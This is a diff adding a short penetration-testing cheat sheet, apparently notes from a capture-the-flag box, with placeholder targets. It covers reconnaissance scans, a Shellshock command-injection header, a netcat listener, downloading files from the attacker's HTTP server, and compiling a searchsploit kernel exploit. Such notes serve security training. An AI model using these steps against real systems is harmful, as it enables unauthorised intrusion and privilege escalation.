@@ -1,0 +1,45 @@
+Nmap Scan:
+nmap -sC -sV -oN nmap_initial machine_ip
+
+Gobuster directory bruteforcing:
+gobuster dir -w /path/to/wordlist -u http://machine_ip/ -t number_of_threads -x php -o output_file
+
+Nikto Scan:
+nikto -h http://machine_ip/
+
+Exploiting Shellshock:
+curl -H 'User-Agent: () { :; }; command' http://machine_ip/cgi-bin/test.cgi
+
+Starting a listener:
+nc -lvnp port_number
+
+Creating a HTTP server:
+python -m SimpleHTTPServer
+#default port is 8000, you can change it if you want by appending it to the end of the above command.
+
+Downloading a file from the server:
+curl -O http://local_ip:8000/filename.extension
+                OR
+wget http://local_ip:8000/filename.extension
+
+Making a script executable for only same user:
+chmod u+x filename.extension
+
+Searching for an exploit on Searchsploit:
+searchsploit query
+#here query was linux 3.13
+
+Searchsploit exploit in detail:
+searchsploit +x path_from_above_query
+
+Compiling the c exploit:
+gcc -pthread filename.c -o output_filename
+
+Displaying the PATH variable:
+echo $PATH
+
+Exporting the PATH variable:
+export PATH=whatever_you_want
+
+Running an exploit from the same directory:
+./name
